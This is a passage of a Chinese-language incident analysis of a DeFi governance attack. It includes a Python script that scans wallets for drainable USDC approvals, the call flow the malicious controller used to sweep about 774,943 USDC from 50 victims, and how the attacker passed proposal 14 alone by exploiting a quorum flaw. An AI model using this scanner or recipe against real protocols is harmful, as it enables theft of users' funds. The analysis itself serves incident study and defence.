BLOCK    = "25535119"                       # PRE_BLOCK = attack block - 1
INF_THRESHOLD = 1 << 200                    # anything above this = "infinite" approval

HERE = Path(__file__).resolve().parent
CAND_FILE = HERE / "dune_query_approve.txt"
OUT_FILE  = HERE / "phase2_drainable.csv"

RPC = os.environ.get("RPC_ETH")
CAST = os.environ.get("CAST_BIN", "cast")   # falls back to PATH


def cast_uint(sig, *args):
    """Call a uint256-returning view fn at BLOCK, return int (with 1 retry)."""
    cmd = [CAST, "call", USDC, sig, *args, "--block", BLOCK, "--rpc-url", RPC]
    err = ""
    for _ in range(2):
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if out.returncode == 0 and out.stdout.strip():
                # cast may print "1000000 [1e6]" -> take first token, drop commas
                return int(out.stdout.strip().split()[0].replace(",", ""))
            err = out.stderr.strip()
        except subprocess.TimeoutExpired:
            err = "timeout"
    print(f"  ! call failed ({sig} {args}): {err}", file=sys.stderr)
    return None


def main():
    if not RPC:
        sys.exit("ERROR: set RPC_ETH to an archive node before running.")

    owners = [ln.strip() for ln in CAND_FILE.read_text().splitlines() if ln.strip()]
    print(f"scanning {len(owners)} candidates at block {BLOCK} ...", file=sys.stderr)

    rows = []
    for i, owner in enumerate(owners, 1):
        allowance = cast_uint("allowance(address,address)(uint256)", owner, PROVIDER)
        balance   = cast_uint("balanceOf(address)(uint256)", owner)
        if allowance is None or balance is None:
            continue
        drainable = min(allowance, balance)
        rows.append({
            "owner": owner,
            "balance": balance,
            "allowance": allowance,
            "infinite": allowance > INF_THRESHOLD,
            "drainable": drainable,
        })
        print(f"  [{i}/{len(owners)}] {owner} drainable={drainable}", file=sys.stderr)

    rows.sort(key=lambda r: r["drainable"], reverse=True)

    # ---- print table (raw integer units) ----
    print("\n{:>3}  {:<44} {:>18} {:>10} {:>18}".format(
        "#", "owner", "balance", "inf", "drainable"))
    total_drainable = 0
    positive = 0
    for idx, r in enumerate(rows, 1):
        if r["drainable"] > 0:
            positive += 1
            total_drainable += r["drainable"]
        print("{:>3}  {:<44} {:>18} {:>10} {:>18}".format(
            idx, r["owner"], r["balance"], "INF" if r["infinite"] else "-", r["drainable"]))

    # ---- summary ----
    print("\n--- summary ---")
    print(f"candidates scanned : {len(rows)}")
    print(f"drainable > 0      : {positive}")
    print(f"total drainable    : {total_drainable}")

    # ---- dump csv (all raw) ----
    with open(OUT_FILE, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["owner", "balance", "allowance", "infinite", "drainable"])
        for r in rows:
            w.writerow([r["owner"], r["balance"], r["allowance"], r["infinite"], r["drainable"]])
    print(f"\nwrote {OUT_FILE}")


if __name__ == "__main__":
    main()

```

--- summary ---

candidates scanned : 100
drainable > 0      : 20
total drainable    : 216366881921

从100条中就找到了20个受害者候选, 全是无限授权. 并且我们从扫描日志中发现很多账号是有USDC余额的, 但是业务完成后撤销了授权而幸免于难

> 实际攻击者找到了50个受害者, 免费扫描也能做, 比如dune分页, 比如使用RPC



### 通过 Controller 获利流程总结

> 我们这这里假设"恶意 Controller 已经就位"(代理 0x66c6 的 implementation 已是恶意的 0x769A,且 Provider 已信任 0x66c6 为自己的 controller)。如何把它伪造并挂上去,留到最后说,这里只讲**已经就位之后如何一次性获利**。

#### 前提(此刻链上状态)

- Provider 0xDAA0 的 controller() == 0x66c6(代理);
- 0x66c6 背后的 implementation 0x769A 里,feesOwner() 与 dao() 都硬编码为攻击者 0xf908;
- 50 个受害者对 Provider 留着 USDC 授权,且账上有余额(drainable = min(balance, allowance) > 0,前两节已复现)。

#### 一次性攻击调用

实际攻击 TX:攻击者 EOA 0xf908 直接调用代理 0x66c6 的 func_e321fa05,代理 delegatecall 进恶意 impl 执行:

```
0xf908  ──func_e321fa05(target=0xDAA0, accounts[50], amounts[50])──▶  0x66c6 (proxy)
                                                                       │ delegatecall
                                                                       ▼
                                                                   0x769A (impl 逻辑)
```




#### 完整调用流程(trace 视角)

```
0xf908 → 0x66c6.func_e321fa05(0xDAA0, [victim_0..49], [amt_0..49])
  │  (delegatecall 进 0x769A, 执行上下文仍是 0x66c6)
  │
  ├─ for i in 0..49, 若 amt_i != 0:
  │     0x66c6 → 0xDAA0._takeUnderlying(victim_i, amt_i)          // msg.sender = 0x66c6 = controller ✓
  │        └─ USDC.safeTransferFrom(victim_i, 0xDAA0, amt_i)      // 拉走受害者 USDC
  │                                                                //（依赖受害者的残留授权 + 余额）
  │     ... 循环 50 次,USDC 逐个进入 Provider ...
  │
  └─ 0x66c6 → 0xDAA0.transferFees()                               // public,无鉴权
        ├─ _withdrawProviderInternal(underlyingFees=0, 0)         // 赎回 0(没有真实手续费)
        ├─ fees = USDC.balanceOf(0xDAA0)                          // = 刚刚拉进来的全部 USDC
        ├─ to   = CompoundController(0x66c6).feesOwner()          // = 0xf908(恶意 impl 硬编码)
        └─ USDC.safeTransfer(0xf908, fees)                        // 全部打给攻击者
```




一笔交易内:50 个受害者的 USDC 被逐一拉进 Provider,再被 transferFees 一次性清扫给攻击者。总额 ≈ **774,943 USDC**。

#### 为什么每一步都能成立

| 环节                                     | 靠什么成立                                                   |
| :--------------------------------------- | :----------------------------------------------------------- |
| func_e321fa05 能调 Provider 的受限函数 | impl 在代理上下文执行,对 Provider 而言 msg.sender = 0x66c6 = controller,天然通过 onlySmartYieldOrController |
| _takeUnderlying 能拉**别人**的钱       | 它的 from_ 是任意地址,只校验"到账量精确等于 amt",不校验 from_ 是不是调用者 |
| 拉款不会中途失败                         | 每个 amt_i 已由攻击者链下扫描设为 min(balance, allowance),恰好不触发余额/授权不足 |
| transferFees 能被攻击者触发            | 它是 public、无 modifier                                     |
| 扫来的钱能流向攻击者                     | transferFees 的收款人 = controller.feesOwner(),而恶意 controller 返回 0xf908 |
| 把拉进来的钱当"手续费"                   | transferFees 用 IERC20(uToken).balanceOf(this) 读**整个**余额,不区分是不是真实 fee |

其中真正**必需**的伪造只有 feesOwner()(决定钱的去向);dao() 在这笔获利交易里并不被读取,它的作用是**封死官方 setController 的应急通道**(见前文"为什么把 dao() 设置为自己"),属于防守而非进攻。

#### 战利品边界

这套 _takeUnderlying + transferFees 组合能碰到的,**只有**:

- Provider 里的闲置 USDC(平时≈0);
- 对 Provider 留着有效授权、且账上有余额的用户(即那 50 个受害者)。

**碰不到**池子本金那 ~7.84M cUSDC——赎回本金要走 _withdrawProvider / _sendUnderlying,二者是 onlySmartYield,而攻击者只拿到了 controller 身份,拿不到 smartYield 身份。这也解释了为什么损失定格在 ~77 万而不是几百万。

#### 一句话总结

> 恶意 controller = **合法的 controller 身份** + **攻击者自己的 feesOwner**。前者让 _takeUnderlying 把受害者的授权额度拉进池子,后者让 transferFees 把池子清扫进攻击者口袋——Provider 全程没有 bug,只是忠实执行了"信任 controller"的设计。



## 恶意Controller如何上位的

攻击发生前(BLOCK=25535120-1=25535119)的恶意Controller 0x66c6f3b4b4b458e6d764759ecf122484ebef7580: Deployed at block 25472222 (2026-07-06 08:13:35 +0000) by hacker (0xf908610e9174c7cd6e9dfd371e238be4511297a1) · Etherscan TX 0xa42c84d2dd4e3141775f419cadc743167c4e2df4c4cf15287ca40128b7e02eba , 它的逻辑合约 0x769A9fA1E2414db14B35c46E4095D6e8f1694565: Deployed at block 25535106 (2026-07-15 02:36:59 +0000) by hacker (0xf908610e9174c7cd6e9dfd371e238be4511297a1) · Etherscan TX 0x4cd595928adb033784b7da8ff110471787a74efacdf0c66f9f74f936e1ae0564

那么接下来问题就是, 旧的Controller在什么时候被谁换成的恶意Controller的

编写脚本:
```sh
export PATH="$PATH:/Users/z/.foundry/bin"
P=0xDAA037F99d168b552c0c61B7Fb64cF7819D78310
TARGET=0x66c6f3b4b4b458e6d764759ecf122484ebef7580
val() { cast call $P 'controller()(address)' --block $1 --rpc-url $RPC_ETH | tr 'A-Z' 'a-z'; }

lo=25472222      # 0x66c6 proxy deploy block (controller can't be it before this)
hi=25535119      # PRE_BLOCK
echo "controller @ $((lo-1)) : $(val $((lo-1)))"   # old controller, just before proxy existed
echo "controller @ $hi       : $(val $hi)"          # == TARGET
while [ $lo -lt $hi ]; do
  mid=$(( (lo+hi)/2 ))
  if [ "$(val $mid)" = "$TARGET" ]; then hi=$mid; else lo=$((mid+1)); fi
done
echo "== switch block   : $lo"
echo "controller before : $(val $((lo-1)))"
echo "controller at     : $(val $lo)"
```

输出

```
controller @ 25472221 : 0x41ab25709e0c3edf027f6099963fe9ad3ebab3a3
controller @ 25535119       : 0x66c6f3b4b4b458e6d764759ecf122484ebef7580
== switch block   : 25535097
controller before : 0x41ab25709e0c3edf027f6099963fe9ad3ebab3a3
controller at     : 0x66c6f3b4b4b458e6d764759ecf122484ebef7580
```

老controller 0x41ab25709e0c3edf027f6099963fe9ad3ebab3a3 (verified, Is Proxy : No) 在 25535097 区块高度(2026-07-15 02:35:11 +0000)被换掉了, 其中老controller Deployed at block 12024584 (2021-03-12 15:57:10 +0000) by 0x378a9c9c44b41c0e8970c358470e4e72eb782302 · Etherscan TX 0x6e7a2791bb3d07ff2db0fde56666d02a5f66702d692b2c35a01a705162c6d18c

那么我们找出谁在这个Blcok中搞事情, 思路: 使用 cast block "$BLOCK" 输出这个块的所有内容, 然后拿我们已经知道的和本次分析相关的地址去匹配, 看看谁参与了
已知的地址有这些

```
ENTRIES=(
  "provider:0xDAA037F99d168b552c0c61B7Fb64cF7819D78310"
  "old_ctrl:0x41ab25709e0c3edf027f6099963fe9ad3ebab3a3"
  "new_ctrl:0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580"
  "mal_impl:0x769A9fA1E2414db14B35c46E4095D6e8f1694565"
  "hacker:0xf908610e9174c7cd6e9dfd371e238be4511297a1"
  "smartYield:0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840"
  "bondModel:0x9af77328a63dc58e4b936f5d4c298d288d36c9da"
)
```

所以脚本

```sh
#!/usr/bin/env zsh


set -euo pipefail
export PATH="$PATH:/Users/z/.foundry/bin"
: "${RPC_ETH:?set RPC_ETH}"

BLOCK=25535097

# case-specific addresses as "label:0xADDR" (portable across bash 3.2 / zsh).
# Generic tokens (USDC/cUSDC/COMP) are intentionally omitted to avoid block-wide noise.
ENTRIES=(
  "provider:0xDAA037F99d168b552c0c61B7Fb64cF7819D78310"
  "old_ctrl:0x41ab25709e0c3edf027f6099963fe9ad3ebab3a3"
  "new_ctrl:0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580"
  "mal_impl:0x769A9fA1E2414db14B35c46E4095D6e8f1694565"
  "hacker:0xf908610e9174c7cd6e9dfd371e238be4511297a1"
  "smartYield:0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840"
  "bondModel:0x9af77328a63dc58e4b936f5d4c298d288d36c9da"
)

# extra addresses from the CLI, labeled extra0, extra1, ...
i=0
for a in "$@"; do ENTRIES+=("extra${i}:${a}"); i=$((i + 1)); done

# build a jq object {label: bare40hex}  (normalize: strip 0x, lower-case)
json="{"
for e in "${ENTRIES[@]}"; do
  label="${e%%:*}"
  addr="${e#*:}"
  addr="${addr#0x}"
  addr="$(printf '%s' "$addr" | tr 'A-Z' 'a-z')"   # lower-case, portable
  json+="\"${label}\":\"${addr}\","
done
json="${json%,}}"

print -u2 "block $BLOCK — scanning for: ${ENTRIES[@]%%:*}"

cast block "$BLOCK" --full --json --rpc-url "$RPC_ETH" \
| jq -r --argjson A "$json" '
    .transactions[] | . as $t
    | ([$t.from, ($t.to // "create"), $t.input] | join(" ") | ascii_downcase) as $blob
    | ([$A | to_entries[] | select(.value as $v | $blob | contains($v)) | .key]) as $hits
    | select($hits | length > 0)
    | "\($t.hash)  from=\($t.from)  to=\($t.to // "CREATE")  hits=[\($hits | join(","))]"
  '

```

输出

```
block 25535097 — scanning for: provider old_ctrl new_ctrl mal_impl hacker smartYield bondModel
0x2e28e0b1dda3fe40c2226d61f9726dc3174098c3332ec0ee8087d35f46a42826  from=0xf908610e9174c7cd6e9dfd371e238be4511297a1  to=CREATE  hits=[hacker]
```

HACKER执行了一笔交易, TX: 0x2e28e0b1dda3fe40c2226d61f9726dc3174098c3332ec0ee8087d35f46a42826

对 0x2e28e0b1dda3fe40c2226d61f9726dc3174098c3332ec0ee8087d35f46a42826 进行trace, 结果如下(剔除了staticcall)

```
0 0 -> CREATE hacker -> 0x8b5f73544e50f18791682d1bcb4bb5011ca81b00 . constructor() -> (225 bytes)
  6 1 -> CALL 0x8b5f73544e50f18791682d1bcb4bb5011ca81b00 -> Governance . execute(14)
    11 2 -> CALL Governance -> old_controller . yieldControllTo(controller)
      12 3 -> CALL old_controller -> CompoundProvider . setController(controller)
        16 4 -> CALL CompoundProvider -> Comp . approve(old_controller, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
          16 5 -> EVENT Comp.Approval (owner=CompoundProvider, spender=old_controller, value=0)
        22 4 -> CALL CompoundProvider -> Comp . approve(controller, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
          22 5 -> EVENT Comp.Approval (owner=CompoundProvider, spender=controller, value=79228162514264337593543950335 [7.922e28])
      23 3 -> CALL old_controller -> SmartYield . setController(controller)
    6 2 -> EVENT Governance.ProposalExecuted (id=795678334539075143075472096425305619273536248576 [7.956e47], initiatorExecution=0x000000000000000000000000000000000000000E)
```

> 可以看出, 恶意controller居然是通过治理渠道合法上位的 (proposalId: 14)

其中0x4cae362d7f227e3d306f70ce4878e245563f3069: Governance (Verified) 

也就是书攻击者成功通过了14号提案,而这个提案就是将老controller替换成新的恶意controller,最后用恶意controller完成攻击并获利



## 14号提案

0x4cAE362D7F227e3d306f70ce4878E245563F3069 Governance 这是 Bond/Covalent (CQT) 链上治理合约, 可以下载和分析源代码, 这里略过, 下面提到的一些治理方法是通过分析源代码得到的.



### 提交提案

攻击者是在 25472231高度(2026-07-06 08:15:23 UTC) 调用 Governance.propose函数发起的提案,提交成功,返回了提案ID 14, 
TX: 0x07ff84e9372b9166f54f3de69b92371c113a370f08b1bef1e116c10ee48b7009

```
0 0 -> CALL hacker -> Governance . propose(old_controller, [0], ["yieldControllTo(address)"], [0x00000000000000000000000066c6f3b4b4b458e6d764759ecf122484ebef7580], "migrate proxy implementation", "migrate proxy implementation") -> (0x000000000000000000000000000000000000000000000000000000000000000e)
  1 1 -> STATICCALL Governance -> Barn . bondStaked() -> (0x000000000000000000000000000000000000000000001eeb42df670e8e9b1e2b)
    2 2 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . bondStaked() -> (0x000000000000000000000000000000000000000000001eeb42df670e8e9b1e2b)
  3 1 -> STATICCALL Governance -> Barn . votingPowerAtTs(hacker, 1783325722 [1.783e9]) -> (0x000000000000000000000000000000000000000000000d8d6baca7aaca9fe000)
    4 2 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . votingPowerAtTs(hacker, 1783325722 [1.783e9]) -> (0x000000000000000000000000000000000000000000000d8d6baca7aaca9fe000)
  0 1 -> EVENT Governance.ProposalCreated (param0=14)
```

成功提交提交需要几个条件

```solidity
        
        // DAO已经激活 或者 全局总质押量达到 ACTIVATION_THRESHOLD = 400,000 × 10^18（即 40 万颗 vBOND). 
        // 这是系统状态, 和提交者没有关系. 当前是激活的
        if (!isActive) {
            require(barn.bondStaked() >= ACTIVATION_THRESHOLD, "DAO not yet active");
            isActive = true;
        }

		// 提交者的投票权必须大于一定的阈值(barn.bondStaked().div(100);), 就是当前全局总质押量的 1%
        require(
            barn.votingPowerAtTs(msg.sender, block.timestamp - 1) >= _getCreationThreshold(),
            "Creation threshold not met"
        );
        
        // 提交者不能有其他仍活跃的提案
        uint256 previousProposalId = latestProposalIds[msg.sender];
        if (previousProposalId != 0) {
            require(_isLiveState(previousProposalId) == false, "One live proposal per proposer");
        }
```

所以关键点就是攻击者的投票权, 我们现在来看攻击者在提交提案前一个区块(25472231-1=25472230)的投票权信息:

Governance.barn 是私有字段, 下载源代码编译后使用 forge inspect storage-layout 得到它的地址是: 0x10e138877df69Ca44Fdc68655f86c88CDe142D7F

```
barn (contract IBarn) @ slot 0xb off 0 size 20B
  value: 0x10e138877df69Ca44Fdc68655f86c88CDe142D7F
  raw: 0x00000000000000000000010110e138877df69ca44fdc68655f86c88cde142d7f
```

然后调用barn.votingPowerAtTs(hacker, timestamp_of_block_25472230), 得到当前hacker的投票权 0x000000000000000000000000000000000000000000000d8d6bd44f4ec2e1f600 (也就是 63999525114155251136000)

```
cast call '0x10e138877df69Ca44Fdc68655f86c88CDe142D7F' 'votingPowerAtTs(address,uint256)' '0xF908610E9174c7cd6e9dfD371e238be4511297A1' '1783325711' --from '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' --block 25472230 --rpc-url $RPC_ETH
```

另外调用 barn.delegatedPowerAtTs(hacker, timestamp_of_block_25472230) 得到的是0, 也就是说没有别人delegate的投票权

调用barn.bondStaked(hacker, timestamp_of_block_25472230) 得到 0x000000000000000000000000000000000000000000001eeb42df670e8e9b1e2b (也就是 146010798026849630494251)

> 63999525114155251136000 / 146010798026849630494251 > 43 %, 远超 1% 的提案阈值, 所以提案可以成功提交

调用 barn.barnbalanceAtTs(hacker, timestamp_of_block_25472230)得到 0x0000000000000000000000000000000000000000000006c6b935b8bbd4000000 (也就是32000000000000000000000, 大概投票权的一半) 

调用 barn.userLockedUntil(hacker)得到锁仓到期时间: 1814861243(timestamp, ≈ 2027-07-06)

> 攻击者锁仓一年得到了约锁仓数量(32000000000000000000000)的2倍的投票权(63999525114155251136000)
>
> 这里只是说明43%远超1%阈值是怎么来的, 对于提交提案根本不需要锁仓, 攻击者的token数量早就超阈值了. 锁仓另有目的. 
>
> (锁仓发生在 0x7da2ea77e45e6bc72bb7e861ea2d0325a4cdf83708567cc319c508b4e07f36b3 (2026-07-06 08:08:11 UTC)), 

关于锁仓能提高投票权的代码在 0xa62da56e9a330646386365dc6b2945b5c4d120ed/contracts/facets/BarnFacet.sol

```solidity
    function votingPowerAtTs(address user, uint256 timestamp) public view returns (uint256) {
        LibBarnStorage.Stake memory stake = stakeAtTs(user, timestamp);

        uint256 ownVotingPower;

        // if the user delegated his voting power to another user, then he doesn't have any voting power left
        if (stake.delegatedTo != address(0)) {
            ownVotingPower = 0;
        } else {
            uint256 balance = stake.amount;
            uint256 multiplier = _stakeMultiplier(stake, timestamp);
            ownVotingPower = balance.mul(multiplier).div(BASE_MULTIPLIER);
        }

        uint256 delegatedVotingPower = delegatedPowerAtTs(user, timestamp);

        return ownVotingPower.add(delegatedVotingPower);
    }
    
    
        function _stakeMultiplier(LibBarnStorage.Stake memory stake, uint256 timestamp) internal view returns (uint256) {
        if (timestamp >= stake.expiryTimestamp) {
            return BASE_MULTIPLIER;
        }

        uint256 diff = stake.expiryTimestamp - timestamp;
        if (diff >= MAX_LOCK) {
            return BASE_MULTIPLIER.mul(2);
        }

        return BASE_MULTIPLIER.add(diff.mul(BASE_MULTIPLIER).div(MAX_LOCK));
    }
```



关于攻击者用于锁仓质押的BOND Token (0x0391D2021f89DC339F60Fff84546EA23E337750f) 是如何来的: 买的

分别在高度 25468111 (2026-07-05 18:27 UTC) TX:0x6af47be9a86862721cfb88402f855a8ffb1498ab19fc32cc31aa830bfc2319e5 和 25467881 (2026-07-05 17:41 UTC) TX: 0xf6387e89a6dc7c6efe5954cc7e73d5fe60271030641d644e1f331fc99f803dcf 分2批在Uniswap V3购入 (https://app.blocksec.com/phalcon/explorer/tx/eth/0xf6387e89a6dc7c6efe5954cc7e73d5fe60271030641d644e1f331fc99f803dcf  and https://app.blocksec.com/phalcon/explorer/tx/eth/0x6af47be9a86862721cfb88402f855a8ffb1498ab19fc32cc31aa830bfc2319e5 ) 总共花费不足600美元 (0.335 ETH)

> 所以, 攻击者花了不到600美元购入了BOND (数量远大于1%提案门槛), 进行了提案提交, 获批, 得到提案号14. 并且攻击者选择了进行1年的质押,以便将自己的投票权翻倍

下面是从Governance(0x4cAE362D7F227e3d306f70ce4878E245563F3069)得到的在25472231高度(刚提交后)的 14号提案的详细内容:

```
proposals : mapping [1 key(s) read]
  [14]
    [14].id : 14
    [14].proposer : 0xF908610E9174c7cd6e9dfD371e238be4511297A1  // 提交者: 攻击者
    [14].description : "migrate proxy implementation" //描述信息
    [14].title : "migrate proxy implementation"  // 标题
    [14].targets : length 1
      [14].targets[0] : 0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3  //执行时的目标合约: old controller
    [14].values : length 1
      [14].values[0] : 0
    [14].signatures : length 1
      [14].signatures[0] : "yieldControllTo(address)"    // 执行时调用目标合约的那个函数: yieldControllTo
    [14].calldatas : length 1
      [14].calldatas[0] : 0x00000000000000000000000066c6f3b4b4b458e6d764759ecf122484ebef7580  // 函数参数(calldata): 恶意合约
    [14].createTime : 1783325722  //创建时间
    [14].eta : 0  // 提案可执行的时间戳，在投票通过后设定。
    [14].forVotes : 0  // 当前支持该提案的票数
    [14].againstVotes : 0  // 当前反对票数
    [14].canceled : false  //是否已经取消
    [14].executed : false  //是否已经执行
    [14].receipts : mapping [no keys read]  // 投票后的收据信息
    [14].parameters
      [14].parameters.warmUpDuration : 172800 // 预热期,不能投票;这段结束的时刻 = 投票权快照点(防闪电贷:提案后马上撤走token), 2天
      [14].parameters.activeDuration : 259200 // 投票窗口,只有这段时间能castVote, 3天
      [14].parameters.queueDuration : 172800 // 投票通过后进入排队(时间锁),等待期,给社区反应/否决的时间,2天
      [14].parameters.gracePeriodDuration : 345600 //排队结束后的可执行窗口;只有落在这段(state=Grace)才能 execute,过期作废, 4 天
      [14].parameters.acceptanceThreshold : 60 // 通过所需赞成比例 >= 60%
      [14].parameters.minQuorum : 40 // 参与投票的总票权 ≥ 快照质押量的 40%
```



### 提案预热

预热为期2天, 设立预热一是防止通过闪电贷等形式提交提案后马上撤离资金. 二是预热期间可以取消, 提交者可以取消, 如果提交者的Token数量降低了到了提案提交门槛阈值一下任何人都可以帮忙取消.

```solidity
function _canCancelProposal(uint256 proposalId) internal view returns (bool){
    Proposal storage proposal = proposals[proposalId];

    if (msg.sender == proposal.proposer ||
        barn.votingPower(proposal.proposer) < _getCreationThreshold()
    ) {
        return true;
    }
    return false;
}
```

三是去拉票/加仓....



### 提案投票

攻击者在高度 25507914 (2026-07-11 07:35 UTC) 进行了对14号提案投了赞成票 (power=63824171486555048192000)
TX: 0x152b146b703dd94f00cf7d7c97face011a841d8c04a2f7a3ae9610decbdcdcad

```
0 0 -> CALL hacker -> Governance . castVote(14, true)
  1 1 -> STATICCALL Governance -> Barn . votingPowerAtTs(hacker, 1783498522 [1.783e9]) -> (0x000000000000000000000000000000000000000000000d83ea4f141190a72800)
    2 2 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . votingPowerAtTs(hacker, 1783498522 [1.783e9]) -> (0x000000000000000000000000000000000000000000000d83ea4f141190a72800)
  0 1 -> EVENT Governance.Vote (proposalId=14, user=hacker, support=true, power=63824171486555048192000 [6.382e22])
```

### 投票状态检查/排队

攻击者在高度 25508121 (2026-07-11 08:16 UTC) 对14号提案进行了queue: 状态检查和排队(如果通过了的话)
TX: 0x660048e026a8d2caa9f9d1e54ba8cdf197030ba8f99e8c0b935f950164ae4492



```
0 0 -> CALL hacker -> Governance . queue(14)
  1 1 -> STATICCALL Governance -> Barn . fallback(1783498522 [1.783e9]) -> (146010798026849630494251 [1.46e23])
    2 2 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . bondStakedAtTs(1783498522 [1.783e9]) -> (146010798026849630494251 [1.46e23])
  0 1 -> EVENT Governance.ProposalQueued (proposalId=14, caller=hacker, eta=1783930522 [1.783e9])
```

调用成功并被返回的eta (提案可执行的时间戳): 1783930522,  2026年7月13日星期一 08:15:22 GMT+0000

所以现在看看提案是如何被判断为通过的

```solidity
    function queue(uint256 proposalId) public {
        require(state(proposalId) == ProposalState.Accepted, "Proposal can only be queued if it is succeeded");

        Proposal storage proposal = proposals[proposalId];
        uint256 eta = proposal.createTime + proposal.parameters.warmUpDuration + proposal.parameters.activeDuration + proposal.parameters.queueDuration;
        proposal.eta = eta;

        for (uint256 i = 0; i < proposal.targets.length; i++) {
            require(
                !queuedTransactions[_getTxHash(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta)],
                "proposal action already queued at eta"
            );

            queueTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);
        }

        emit ProposalQueued(proposalId, msg.sender, eta);
    }
    
    function state(uint256 proposalId) public view returns (ProposalState) {
        require(0 < proposalId && proposalId <= lastProposalId, "invalid proposal id");

        Proposal storage proposal = proposals[proposalId];

        if (proposal.canceled) {
            return ProposalState.Canceled;
        }

        if (proposal.executed) {
            return ProposalState.Executed;
        }

        if (block.timestamp <= proposal.createTime + proposal.parameters.warmUpDuration) {
            return ProposalState.WarmUp;
        }

        if (block.timestamp <= proposal.createTime + proposal.parameters.warmUpDuration + proposal.parameters.activeDuration) {
            return ProposalState.Active;
        }

        if ((proposal.forVotes + proposal.againstVotes) < _getQuorum(proposal) ||
            (proposal.forVotes < _getMinForVotes(proposal))) {
            return ProposalState.Failed;
        }

        if (proposal.eta == 0) {
            return ProposalState.Accepted;
        }

        if (block.timestamp < proposal.eta) {
            return ProposalState.Queued;
        }

        if (_proposalAbrogated(proposalId)) {
            return ProposalState.Abrogated;
        }

        if (block.timestamp <= proposal.eta + proposal.parameters.gracePeriodDuration) {
            return ProposalState.Grace;
        }

        return ProposalState.Expired;
    }
```

关键点在

```solidity
    if ((proposal.forVotes + proposal.againstVotes) < _getQuorum(proposal) ||
        (proposal.forVotes < _getMinForVotes(proposal))) {
        return ProposalState.Failed;
    }
        
    function _getQuorum(Proposal storage proposal) internal view returns (uint256) {
        return barn.bondStakedAtTs(_getSnapshotTimestamp(proposal)).mul(proposal.parameters.minQuorum).div(100);
    }
    
    function _getMinForVotes(Proposal storage proposal) internal view returns (uint256) {
        return (proposal.forVotes + proposal.againstVotes).mul(proposal.parameters.acceptanceThreshold).div(100);
    }
```

- 如果投票总数(赞成票+反对票) 小于 快照时总质押token的40% 判断为失败
- 如果赞成比例小于60% 判定为失败

这里有一个坑: 

左边： forVotes + againstVotes — 投票中收集到的投票权总和（经过了锁仓乘数放大）

右边： _getQuorum() — bondStakedAtTs(快照时间) × minQuorum / 100, 

而 bondStakedAtTs() 返回的是原始质押量，不含任何锁仓乘数加成。

假设这样一个场景：

| 指标              | 数值                  |
| ----------------- | --------------------- |
| 总质押量（原始）  | 1000000 vBOND         |
| minQuorum = 40    | quorum = 400000       |
| 你一个人质押了    | 300000 vBOND          |
| 你锁仓后乘数 = 2x | 你的投票权 = 600000   |
| 你投了赞成        | forVotes = 600000     |
| 总参与票数        | 600,000 + 0 = 600,000 |

> 600,000 >= 400,000  → 你一个人就过了 quorum

因为你的 300,000 质押通过锁仓放大到了 600,000 投票权，但 quorum 的基准是原始质押量，没算乘数。所以实际上，投票权的"通胀"使得 quorum 相对更容易达到。

> 就这回答了前面章节的问题, 为什么要攻击者为什么好质押, 而是不买更多的Token (因为没有用, 更多Token不会让你超越40%)

>  所以, 攻击者一人投票, 提案通过



### 提案执行

既然通过了, 后面就是自然而然的恶意controller成功替换了掉了老controller

```
0 0 -> CREATE hacker -> 0x8b5f73544e50f18791682d1bcb4bb5011ca81b00 . constructor() -> (225 bytes)
  1 1 -> STATICCALL 0x8b5f73544e50f18791682d1bcb4bb5011ca81b00 -> Governance . state(14) -> (0x0000000000000000000000000000000000000000000000000000000000000006)
    2 2 -> STATICCALL Governance -> Barn . bondStakedAtTs(1783498522 [1.783e9]) -> (0x000000000000000000000000000000000000000000001eeb42df670e8e9b1e2b)
      3 3 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . bondStakedAtTs(1783498522 [1.783e9]) -> (0x000000000000000000000000000000000000000000001eeb42df670e8e9b1e2b)
    4 2 -> STATICCALL Governance -> Barn . bondStakedAtTs(1783757806 [1.783e9]) -> (0x000000000000000000000000000000000000000000002d48c43df1edc3d31e2b)
      5 3 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . bondStakedAtTs(1783757806 [1.783e9]) -> (0x000000000000000000000000000000000000000000002d48c43df1edc3d31e2b)
  6 1 -> CALL 0x8b5f73544e50f18791682d1bcb4bb5011ca81b00 -> Governance . execute(14)
    7 2 -> STATICCALL Governance -> Barn . bondStakedAtTs(1783498522 [1.783e9]) -> (0x000000000000000000000000000000000000000000001eeb42df670e8e9b1e2b)
      8 3 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . bondStakedAtTs(1783498522 [1.783e9]) -> (0x000000000000000000000000000000000000000000001eeb42df670e8e9b1e2b)
    9 2 -> STATICCALL Governance -> Barn . bondStakedAtTs(1783757806 [1.783e9]) -> (0x000000000000000000000000000000000000000000002d48c43df1edc3d31e2b)
      10 3 -> DELEGATECALL Barn -> [Proxy] Barn [Logic] BarnFacet . bondStakedAtTs(1783757806 [1.783e9]) -> (0x000000000000000000000000000000000000000000002d48c43df1edc3d31e2b)
    11 2 -> CALL Governance -> old_controller . yieldControllTo(controller)
      12 3 -> CALL old_controller -> CompoundProvider . setController(controller)
      23 3 -> CALL old_controller -> SmartYield . setController(controller)
    6 2 -> EVENT Governance.ProposalExecuted (id=795678334539075143075472096425305619273536248576 [7.956e47], initiatorExecution=0x000000000000000000000000000000000000000E)
  24 1 -> STATICCALL 0x8b5f73544e50f18791682d1bcb4bb5011ca81b00 -> Governance . state(14) -> (0x0000000000000000000000000000000000000000000000000000000000000008)
```

